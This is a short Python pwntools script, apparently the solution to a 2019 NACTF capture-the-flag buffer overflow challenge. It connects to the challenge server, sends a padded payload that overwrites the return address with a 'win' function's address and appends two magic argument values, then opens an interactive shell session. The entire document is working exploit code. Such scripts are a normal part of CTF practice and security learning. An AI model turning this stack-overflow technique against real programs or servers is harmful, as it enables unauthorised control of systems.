from pwn import *

p = remote("shell.2019.nactf.com", 31184)
#p = process("./buf")

e = ELF("./buf")
p.sendline("A" * 0x18 + "A" * 4 + p32(e.symbols["win"]) + "A" * 4 + p64(0x14B4DA55) + p32(0xF00DB4BE)) 

p.interactive()
